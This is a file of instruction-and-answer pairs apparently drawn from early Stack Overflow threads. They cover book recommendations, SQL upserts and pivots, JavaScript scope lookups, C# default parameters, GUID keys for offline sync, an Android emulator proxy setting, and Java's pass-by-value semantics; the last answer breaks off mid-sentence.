{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "The Hitchhikers Guide to the Galaxy. Best book I ever read."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Pragmatic Thinking and Learning: Refactor Your Wetware\nby Andy Hunt\n\nIt covers what's going on in your head while programming and learning, and states that this process is more important than what goes on in your IDE.\nAndy Hunt is also the writer of \"The Pragmatic Programmer\""}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Facts and Fallacies of Software Engineering\nby Robert L. Glass"}
{"instruction": "I've written a stored proc that will do an update if a record exists, otherwise it will do an insert. It looks something like this:\nupdate myTable set Col1=@col1, Col2=@col2 where ID=@ID\nif @@rowcount = 0\ninsert into myTable (Col1, Col2) values (@col1, @col2)\n\nMy logic behind writing it in this way is that the update will perform an implicit select using the where clause and if that returns 0 then the insert will take place.\nThe alternative to doing it this way would be to do a select and then based on the number of rows returned either do an update or insert. This I considered inefficient because if you are to do an update it will cause 2 selects (the first explicit select call and the second implicit in the where of the update). If the proc were to do an insert then there'd be no difference in efficiency.\nIs my logic sound here?\nIs this how you would combine an insert and update into a stored proc?", "output": "Your logic seems sound, but you might want to consider adding some code to prevent the insert if you had passed in a specific primary key.\nOtherwise, if you're always doing an insert if the update didn't affect any records, what happens when someone deletes the record before you \"UPSERT\" runs?  Now the record you were trying to update doesn't exist, so it'll create a record instead.  That probably isn't the behavior you were looking for."}
{"instruction": "Things like $log$ and $version$ which add data upon check-in to the file. I'm interested in seeing the other ones and what information they can provide, but I can't get much info unless I know what they are called.", "output": "Both Subversion and CVS call them Keywords.\nHave a look in the SVN manual here (scroll down to svn:keywords) or here for CVS."}
{"instruction": "Things like $log$ and $version$ which add data upon check-in to the file. I'm interested in seeing the other ones and what information they can provide, but I can't get much info unless I know what they are called.", "output": "In SVN these are simply called \"properties\". You can read about them in the SVN book:\nhttp://svnbook.red-bean.com/en/1.8/svn.advanced.props.html\n\nErr, so, are they called properties or keywords? Oh, I see. In SVN you can associate arbitrary metadata, called \"properties\", with versioned files; some of the properties you can set are to set up keyword substitution in the files themselves."}
{"instruction": "Here's my scenario - I have an SSIS job that depends on another prior SSIS job to run. I need to be able to check the first job's status before I kick off the second one. It's not feasible to add the 2nd job into the workflow of the first one, as it is already way too complex. I want to be able to check the first job's status (Failed, Successful, Currently Executing) from the second one's, and use this as a condition to decide whether the second one should run, or wait for a retry. I know this can be done by querying the MSDB database on the SQL Server running the job. I'm wondering of there is an easier way, such as possibly using the WMI Data Reader Task? Anyone had this experience?", "output": "You may want to create a third package the runs packageA and then packageB.  The third package would only contain two execute package tasks.\nhttp://msdn.microsoft.com/en-us/library/ms137609.aspx\n@Craig\nA status table is an option but you will have to keep monitoring it.\nHere is an article about events in SSIS for you original question.\nhttp://www.databasejournal.com/features/mssql/article.php/3558006"}
{"instruction": "Here's my scenario - I have an SSIS job that depends on another prior SSIS job to run. I need to be able to check the first job's status before I kick off the second one. It's not feasible to add the 2nd job into the workflow of the first one, as it is already way too complex. I want to be able to check the first job's status (Failed, Successful, Currently Executing) from the second one's, and use this as a condition to decide whether the second one should run, or wait for a retry. I know this can be done by querying the MSDB database on the SQL Server running the job. I'm wondering of there is an easier way, such as possibly using the WMI Data Reader Task? Anyone had this experience?", "output": "Why not use a table?  Just have the first job update the table with it's status.  The second job can use the table to check the status.  That should do the trick if I am reading the question correctly.  The table would (should) only have one row so it won't kill performance and shouldn't cause any deadlocking (of course, now that I write it, it will happen) :)\n@Jason: Yeah, you could monitor it or you could have a trigger start the second job when the end status is recieved. :)"}
{"instruction": "In python one can get a dictionary of all local and global variables in the current scope with the built-in functions locals() and globals().  Is there some equivalent way of doing this in javascript?  For instance, I would like to do something like the following:\nvar foo = function(){ alert('foo'); };\nvar bar = function(){ alert('bar'); };\n\nvar s = 'foo';\nlocals()[s](); // alerts 'foo'\n\nIs this at all possible, or should I just be using a local object for the lookup?", "output": "Well, I don't think that there is something like that in js. You can always use eval instead of locals(). Like this: \neval(s+\"()\");\n\nYou just have to know that actually function foo exists.\nEdit:\nDon't use eval:) Use:\nvar functionName=\"myFunctionName\";\nwindow[functionName]();"}
{"instruction": "In python one can get a dictionary of all local and global variables in the current scope with the built-in functions locals() and globals().  Is there some equivalent way of doing this in javascript?  For instance, I would like to do something like the following:\nvar foo = function(){ alert('foo'); };\nvar bar = function(){ alert('bar'); };\n\nvar s = 'foo';\nlocals()[s](); // alerts 'foo'\n\nIs this at all possible, or should I just be using a local object for the lookup?", "output": "AFAIK, no. If you just want to check the existence of a given variable, you can do it by testing for it, something like this:\nif (foo) foo();"}
{"instruction": "I was curious about how other people use the this keyword. I tend to use it in constructors, but I may also use it throughout the class in other methods. Some examples:\nIn a constructor:\npublic Light(Vector v)\n{\n    this.dir = new Vector(v);\n}\n\nElsewhere\npublic void SomeMethod()\n{\n    Vector vec = new Vector();\n    double d = (vec * vec) - (this.radius * this.radius);\n}", "output": "You should not use \"this\" unless you absolutely must.\nThere IS a penalty associated with unnecessary verbosity. You should strive for code that is exactly as long as it needs to be, and no longer."}
{"instruction": "In python one can get a dictionary of all local and global variables in the current scope with the built-in functions locals() and globals().  Is there some equivalent way of doing this in javascript?  For instance, I would like to do something like the following:\nvar foo = function(){ alert('foo'); };\nvar bar = function(){ alert('bar'); };\n\nvar s = 'foo';\nlocals()[s](); // alerts 'foo'\n\nIs this at all possible, or should I just be using a local object for the lookup?", "output": "I seem to remember Brendan Eich commented on this in a recent podcast; if i recall correctly, it's not being considered, as it adds unreasonable restrictions to optimization. He compared it to the arguments local in that, while useful for varargs, its very existence removes the ability to guess at what a function will touch just by looking at its definition. \nBTW: i believe JS did have support for accessing locals through the arguments local at one time - a quick search shows this has been deprecated though."}
{"instruction": "In python one can get a dictionary of all local and global variables in the current scope with the built-in functions locals() and globals().  Is there some equivalent way of doing this in javascript?  For instance, I would like to do something like the following:\nvar foo = function(){ alert('foo'); };\nvar bar = function(){ alert('bar'); };\n\nvar s = 'foo';\nlocals()[s](); // alerts 'foo'\n\nIs this at all possible, or should I just be using a local object for the lookup?", "output": "@e-bartek, I think that window[functionName] won't work if you in some closure, and the function name is local to that closure.  For example:\nfunction foo() {\n    var bar = function () {\n        alert('hello world');\n    };\n    var s = 'bar';\n    window[s](); // this won't work\n}\n\nIn this case, s is 'bar', but the function 'bar' only exists inside the scope of the function 'foo'.  It is not defined in the window scope.\nOf course, this doesn't really answer the original question, I just wanted to chime in on this response.  I don't believe there is a way to do what the original question asked."}
{"instruction": "In python one can get a dictionary of all local and global variables in the current scope with the built-in functions locals() and globals().  Is there some equivalent way of doing this in javascript?  For instance, I would like to do something like the following:\nvar foo = function(){ alert('foo'); };\nvar bar = function(){ alert('bar'); };\n\nvar s = 'foo';\nlocals()[s](); // alerts 'foo'\n\nIs this at all possible, or should I just be using a local object for the lookup?", "output": "@pkaeding\nYes, you're right. window[functionName]() doesn't work in this case, but eval does. If I needed something like this, I'd create my own object to keep those functions together.\nvar func = {};\nfunc.bar = ...;\nvar s = \"bar\";\nfunc[s]();"}
{"instruction": "Is it true that the only way to handle default function arguments is through function overloading?\nFor example, in PHP I can do this:\nfunction foo($x, $y=0)\n{\n}\n\nWould the best way to handle it in C# be this?\nvoid foo(int x)\n{\n  foo(x, 0);\n}\n\nvoid foo(int x, int y)\n{\n}\n\nExample lifted from here\nEdit\nMade the C# example into actual C# (Thanks Blair Conrad)", "output": "Yes, that'd be best, except you'd omit the $s on the parameter names, as others have pointed out. For those interested in the rationale behind the lack of default parameter values, see @Giovanni Galbo's explanation."}
{"instruction": "Is it true that the only way to handle default function arguments is through function overloading?\nFor example, in PHP I can do this:\nfunction foo($x, $y=0)\n{\n}\n\nWould the best way to handle it in C# be this?\nvoid foo(int x)\n{\n  foo(x, 0);\n}\n\nvoid foo(int x, int y)\n{\n}\n\nExample lifted from here\nEdit\nMade the C# example into actual C# (Thanks Blair Conrad)", "output": "Default arguments are part of C++, but as of C# 3.5 default arguments are still not supported-- you'll have to overload.  They've been available in VB.Net since 1.0."}
{"instruction": "Is it true that the only way to handle default function arguments is through function overloading?\nFor example, in PHP I can do this:\nfunction foo($x, $y=0)\n{\n}\n\nWould the best way to handle it in C# be this?\nvoid foo(int x)\n{\n  foo(x, 0);\n}\n\nvoid foo(int x, int y)\n{\n}\n\nExample lifted from here\nEdit\nMade the C# example into actual C# (Thanks Blair Conrad)", "output": "Yes. \nOr currying. \nOr abstracting into a class and using default values there."}
{"instruction": "Is it true that the only way to handle default function arguments is through function overloading?\nFor example, in PHP I can do this:\nfunction foo($x, $y=0)\n{\n}\n\nWould the best way to handle it in C# be this?\nvoid foo(int x)\n{\n  foo(x, 0);\n}\n\nvoid foo(int x, int y)\n{\n}\n\nExample lifted from here\nEdit\nMade the C# example into actual C# (Thanks Blair Conrad)", "output": "No, AFAIK C# does not support overriding, and yes, that is the recommended way of accomplishing the same effect."}
{"instruction": "Yes, it sounds crazy....It might be.\nThe final updatepanel does not appear to trigger anything, it just refreshes the update panels and does not call back to the usercontrol hosting it.\nAny ideas?\nEDIT: I got it posting back, however the controls inside the final usercontrol have lost their data...I'm thinking its because the main repeater is rebinding on each postback...Not sure where to take this one now.", "output": "If you set the UpdateMode property to Conditional (default is Always) on both UpdatePanels it should stop the outer UpdatePanel triggering when only the usercontrols updatepanel should have refreshed."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Brain Rules\nby John Medina\nThis book explores, in a surprisingly concise and entertaining manner, how our brains work and how to make them work better. Medina is a master of practicing what he preaches and has produced a work that everyone can enjoy, particularly programmers and geeks. What makes this book particularly interesting is the holistic approach to delivery of the content. There is a fascinating website to compliment the book as well as an included film on DVD. There is also an audio book narrated by the author and a blog.\nThis is definitely a book I think all programmers - actually, everyone - should read. I reckon it could be the catalyst for some cool exercising while you work innovations."}
{"instruction": "Is it true that the only way to handle default function arguments is through function overloading?\nFor example, in PHP I can do this:\nfunction foo($x, $y=0)\n{\n}\n\nWould the best way to handle it in C# be this?\nvoid foo(int x)\n{\n  foo(x, 0);\n}\n\nvoid foo(int x, int y)\n{\n}\n\nExample lifted from here\nEdit\nMade the C# example into actual C# (Thanks Blair Conrad)", "output": "Just to satisfy some curiosity:\nFrom Why doesn't C# support default parameters?:\n\nIn languages such as C++, a default value can be included as part of the method declaration:\nvoid Process(Employee employee, bool bonus = false)\nThis method can be called either with:\na.Process(employee, true);\nor\na.Process(employee);\nin the second case, the parameter bonus is set to false.\nC# doesn't have this feature.\nOne reason we don't have this feature is related to a specific implementation of the feature. In the C++ world, when the user writes:\na.Process(employee);\nthe compiler generates\na.process(employee, false);\nIn other words, the compiler takes the default value that is specified in the method prototype and puts it into the method call - it's just as if the user wrote 'false' as the second parameter. There's no way to change that default value without forcing the user of the class to recompile, which is unfortunate.\nThe overloading model works better in this respect. The framework author just defines two separate methods, and the single-parameter one calls the two-parameter method. This keeps the default value in the framework, where it can be modified if necessary.\nIt would be possible for a compiler to take something like the C++ definition and produce the overloads, but there are a few issues with that approach.\nThe first one is that the correlation between the code that the user writes and the code the compiler generates is less obvious. We generally try to limit magic when possible, as it makes it harder for programmers. The second issue has to do with things like XML doc comments and intellisense. The compiler would have to have special rules for how it generates doc comments for the overloaded methods, and intellisense would need to have smarts to collapse the overloaded methods into a single method.\nWriting overloads yourself is a bit less convenient, but we think it's an acceptable solution."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Tolstoy's War and Peace. It's an immense (and immensely awesome) classic work of literature. Reading it and re-reading it, analyzing it time and again--all this will help you start thinking in terms of understanding instead of knowing, something we could all benefit from as developers. \nEDIT\nI recommend the Anne Dunigan (sp.?) translation especially."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Another one from a different angle from prior posts:  G\u00f6del, Escher, Bach: an Eternal Golden Braid, by Douglas Hofstadter."}
{"instruction": "In python one can get a dictionary of all local and global variables in the current scope with the built-in functions locals() and globals().  Is there some equivalent way of doing this in javascript?  For instance, I would like to do something like the following:\nvar foo = function(){ alert('foo'); };\nvar bar = function(){ alert('bar'); };\n\nvar s = 'foo';\nlocals()[s](); // alerts 'foo'\n\nIs this at all possible, or should I just be using a local object for the lookup?", "output": "locals() - No. \nglobals() - Yes.\n\nwindow is a reference to the global scope, like globals() in python.\nglobals()[\"foo\"]\n\nis the same as:\nwindow[\"foo\"]"}
{"instruction": "Has anybody managed to get the Android Emulator working behind a proxy which requires authentication?\nI've tried setting the -http-proxy argument to \nhttp://DOMAIN/USERNAME:PASSWORD@IP:PORT\n\nbut am having no success. \nI've tried following the docs to no avail. I've also tried the -verbose-proxy setting but this no longer seems to exist.\nAny pointers?", "output": "I remember having the same problem - After searching on the web, I found this solution - From the command line,\n1. > adb shell\n2. # sqlite3 /data/data/com.android.providers.settings/databases/settings.db\n3. sqlite> INSERT INTO system VALUES(99,\u2019http_proxy', 'proxy:port');\n4. sqlite>.exit\n\nEDIT:\nEdited answer to reflect the latest version of Android."}
{"instruction": "Is it true that the only way to handle default function arguments is through function overloading?\nFor example, in PHP I can do this:\nfunction foo($x, $y=0)\n{\n}\n\nWould the best way to handle it in C# be this?\nvoid foo(int x)\n{\n  foo(x, 0);\n}\n\nvoid foo(int x, int y)\n{\n}\n\nExample lifted from here\nEdit\nMade the C# example into actual C# (Thanks Blair Conrad)", "output": "Regarding the excerpt from the c# faq:  \nMost of the problems listed there were solved for VB.Net (specifically the intellisense and xml comments issues), meaning they're really red herrings-- there is code available to the C# team that will solve the problem. \nAnother reason has to do with forcing a user of a class to re-compile, but that's a bit of a red herring, too.  If you change a default value in your framework class and the user does not have to recompile, you risk the user not knowing that the default value changed.  Now you have a potential bug in the code that doesn't show up until runtime.  In other words, the alternative of overloading the function is at least as bad.  Of course, this also presumes a specific implementation of the feature, but it's the implementation suggested in the faq.\nTherefore you have to weigh the remaining reason (\"try to limit the magic\") vs the fact (which they acknowledge) that writing the overloads is \"a bit less convenient\".  Personally, I say put the feature in, and let the programmer decide whether or not to use it."}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "Guids will certainly be slower (and use more memory) than standard integer keys, but whether or not that is an issue will depend on the type of load your system will see.  Depending on your backend DB there may be issues with indexing guid fields.\nUsing guids simplifies a whole class of problems, but you pay for it part will performance and also debuggability - typing guids into those test queries will get old real fast!"}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "This is a perfectly good use of GUIDs. The only draw backs would be a slight complexity in working with GUIDs over INTs and the slight size difference (16 bytes vs 4 bytes).\nI don't think either of those are a big deal."}
{"instruction": "I want to show a chromeless modal window with a close button in the upper right corner.\nIs this possible?", "output": "Check out this blog post on kirupa."}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "The backend will be SQL Server 2005\nFrontend / Application Logic will be .Net\nBesides GUIDs, can you think of other ways to resolve the \"merge\" that happens when the offline computer syncs the new data back into the central database?\nI mean, if the keys are INTs, i'll have to renumber everything when importing basically. GUIDs will spare me of that."}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "Using GUIDs saved us a lot of work when we had to merge two databases into one."}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "If your database is small enough to download to a laptop and work with it offline, you probably don't need to worry too much about the performance differences between ints and Guids.  But do not underestimate how useful ints are when developing and troubleshooting a system!  You will probably need to come up with some fairly complex import/synch logic regardless of whether or not you are using Guids, so they might not help as much as you think."}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "Will access to these tables through\n  the GUID key be slow?\n\nThere are other problems with GUIDs, you see GUIDs are not sequential, so inserts will be scattered all over the place, this causes page splits and index fragmentation\nIn SQL Server 2005 MS introduced NEWSEQUENTIALID() to fix this, the only problem for you might be that you can only use NEWSEQUENTIALID as a default value in a table"}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "Using Guids as primary keys is acceptable and is considered a fairly standard practice for the same reasons that you are considering them.  They can be overused which can make things a bit tedious to debug and manage, so try to keep them out of code tables and other reference data if at all possible.\nThe thing that you have to concern yourself with is the human readable identifier.  Guids cannot be exchanged by people - can you imagine trying to confirm your order number over the phone if it is a guid?  So in an offline scenario you may still have to generate something - like a publisher (workstation/user) id and some sequence number, so the order number may be 123-5678 -.  \nHowever this may not satisfy business requirements of having a sequential number.  In fact regulatory requirements can be and influence - some regulations (SOX maybe) require that invoice numbers are sequential.  In such cases it may be neccessary to generate a sort of proforma number which is fixed up later when the systems synchronise.  You may land up with tables having OrderId (Guid), OrderNo (int), ProformaOrderNo (varchar) - some complexity may creep in.\nAt least having guids as primary keys means that you don't have to do a whole lot of cascading updates when the sync does eventually happen - you simply update the human readable number."}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "@Simon,  \nYou raise very good points. I was already thinking about the \"temporary\" \"human-readable\" numbers i'd generate while offline, that i'd recreate on sync. But i wanted to avoid doing with with foreign keys, etc."}
{"instruction": "Trying to find some simple SQL Server PIVOT examples.  Most of the examples that I have found involve counting or summing up numbers.  I just want to pivot some string data.  For example, I have a query returning the following.\nAction1 VIEW  \nAction1 EDIT  \nAction2 VIEW  \nAction3 VIEW  \nAction3 EDIT  \n\nI would like to use PIVOT (if even possible) to make the results like so:\nAction1 VIEW EDIT  \nAction2 VIEW NULL  \nAction3 VIEW EDIT  \n\nIs this even possible with the PIVOT functionality?", "output": "Remember that the MAX aggregate function will work on text as well as numbers. This query  will only require the table to be scanned once.\nSELECT Action,\n       MAX( CASE data WHEN 'View' THEN data ELSE '' END ) ViewCol, \n       MAX( CASE data WHEN 'Edit' THEN data ELSE '' END ) EditCol\n FROM t\n GROUP BY Action"}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "i would start to look at SQL Server Compact Edition for this! It helps with all of your issues.  \nData Storage Architecture with SQL Server 2005 Compact Edition\nIt specifically designed for \n\nField force applications (FFAs). FFAs\n  usually share one or more of the\n  following attributes\nThey allow the user to perform their\n  job functions while disconnected from\n  the back-end network\u2014on-site at a\n  client location, on the road, in an\n  airport, or from home. \nFFAs are usually designed for\n  occasional connectivity, meaning that\n  when users are running the client\n  application, they do not need to have\n  a network connection of any kind. FFAs\n  often involve multiple clients that\n  can concurrently access and use data\n  from the back-end database, both in a\n  connected and disconnected mode. \nFFAs must be able to replicate data\n  from the back-end database to the\n  client databases for offline support.\n  They also need to be able to replicate\n  modified, added, or deleted data\n  records from the client to the server\n  when the application is able to\n  connect to the network"}
{"instruction": "We are working on designing an application that is typically OLTP (think: purchasing system). However, this one in particular has the need that some users will be offline, so they need to be able to download the DB to their machine, work on it, and then sync back once they're on the LAN.\nI would like to note that I know this has been done before, I just don't have experience with this particular model.\nOne idea I thought about was using GUIDs as table keys. So for example, a Purchase Order would not have a number (auto-numeric) but a GUID instead, so that every offline client can generate those, and I don't have clashes when I connect back to the DB.\nIs this a bad idea for some reason?\nWill access to these tables through the GUID key be slow?\nHave you had experience with these type of systems? How have you solved this problem?\nThanks!\nDaniel", "output": "First thought that comes to mind: Hasn't MS designed the DataSet and DataAdapter model to support scenarios like this?\nI believe I read that MS changed their ADO recordset model to the current DataSet model so it works great offline too. And there's also this Sync Services for ADO.NET\nI believe I have seen code that utilizes the DataSet model which also uses foreign keys and they still sync perfectly when using the DataAdapter. Havn't try out the Sync Services though but I think you might be able to benefit from that too.\nHope this helps."}
{"instruction": "I've written a stored proc that will do an update if a record exists, otherwise it will do an insert. It looks something like this:\nupdate myTable set Col1=@col1, Col2=@col2 where ID=@ID\nif @@rowcount = 0\ninsert into myTable (Col1, Col2) values (@col1, @col2)\n\nMy logic behind writing it in this way is that the update will perform an implicit select using the where clause and if that returns 0 then the insert will take place.\nThe alternative to doing it this way would be to do a select and then based on the number of rows returned either do an update or insert. This I considered inefficient because if you are to do an update it will cause 2 selects (the first explicit select call and the second implicit in the where of the update). If the proc were to do an insert then there'd be no difference in efficiency.\nIs my logic sound here?\nIs this how you would combine an insert and update into a stored proc?", "output": "If you are not doing a merge in SQL 2008 you must change it to:\nif @@rowcount = 0 and @@error=0\notherwise if the update fails for some reason then it will try and to an insert afterwards because the rowcount on a failed statement is 0"}
{"instruction": "I always thought Java was pass-by-reference; however I've seen a couple of blog posts (for example, this blog) that claim it's not. I don't think I understand the distinction they're making. \nWhat is the explanation?", "output": "Java is always pass by value, with no exceptions, ever.\nSo how is it that anyone can be at all confused by this, and believe that Java is pass by reference, or think they have an example of Java acting as pass by reference? The key point is that Java never provides direct access to the values of objects themselves, in any circumstances. The only access to objects is through a reference to that object. Because Java objects are always accessed through a reference, rather than directly, it is common to talk about fields and variables and method arguments as being objects, when pedantically they are only references to objects. The confusion stems from this (strictly speaking, incorrect) change in nomenclature.\nSo, when calling a method\n\nFor primitive arguments (int, long, etc.), the pass by value is the actual value of the primitive (for example, 3).\nFor objects, the pass by value is the value of the reference to the object.\n\nSo if you have doSomething(foo) and public void doSomething(Foo foo) { .. } the two Foos have copied references that point to the same objects.\nNaturally, passing by value a reference to an object looks very much like (and is indistinguishable in practice from) passing an object by reference."}
{"instruction": "I always thought Java was pass-by-reference; however I've seen a couple of blog posts (for example, this blog) that claim it's not. I don't think I understand the distinction they're making. \nWhat is the explanation?", "output": "Java passes references by value.\nSo you can't change the reference that gets passed in."}
{"instruction": "I always thought Java was pass-by-reference; however I've seen a couple of blog posts (for example, this blog) that claim it's not. I don't think I understand the distinction they're making. \nWhat is the explanation?", "output": "Basically, reassigning Object parameters doesn't affect the argument, e.g.,\nprivate void foo(Object bar) {\n    bar = null;\n}\n\npublic static void main(String[] args) {\n    String baz = \"Hah!\";\n    foo(baz);\n    System.out.println(baz);\n}\n\nwill print out \"Hah!\" instead of NULL. The reason this works is because bar is a copy of the value of baz, which is just a reference to \"Hah!\". If it were the actual reference itself, then foo would have redefined baz to null."}
{"instruction": "I always thought Java was pass-by-reference; however I've seen a couple of blog posts (for example, this blog) that claim it's not. I don't think I understand the distinction they're making. \nWhat is the explanation?", "output": "Java passes references to objects by value."}
{"instruction": "I always thought Java was pass-by-reference; however I've seen a couple of blog posts (for example, this blog) that claim it's not. I don't think I understand the distinction they're making. \nWhat is the explanation?", "output": "Java is always pass-by-value. Unfortunately, they decided to call pointers references, thus confusing newbies. Because those references are passed by value.\nIt goes like this:\npublic static void main( String[] args ){\n    Dog aDog = new Dog(\"Max\");\n    foo(aDog);\n\n    if (aDog.getName().equals(\"Max\")) { //true\n        System.out.println( \"Java passes by value.\" );\n\n    } else if (aDog.getName().equals(\"Fifi\")) {\n        System.out.println( \"Java passes by reference.\" );\n    }\n}\n\npublic static void foo(Dog d) {\n    d.getName().equals(\"Max\"); // true\n\n    d = new Dog(\"Fifi\");\n    d.getName().equals(\"Fifi\"); // true\n}\n\nIn this example aDog.getName() will still return \"Max\". The value aDog within main is not overwritten in the function foo with the Dog \"Fifi\" as the object reference is passed by value. If it were passed by reference, then the aDog.getName() in main would return \"Fifi\" after the call to foo.\nLikewise:\nDog aDog = new Dog(\"Max\");\nfoo(aDog);\naDog.getName().equals(\"Fifi\"); // true\npublic void foo(Dog d) {\n    d.getName().equals(\"Max\"); // true\n    d.setName(\"Fifi\");\n}\n\nIn the above example, FiFi is the dog's name after call to foo(aDog). Any operations that foo performs on d are such that, for all practical purposes, they are performed on aDog itself (except d=new 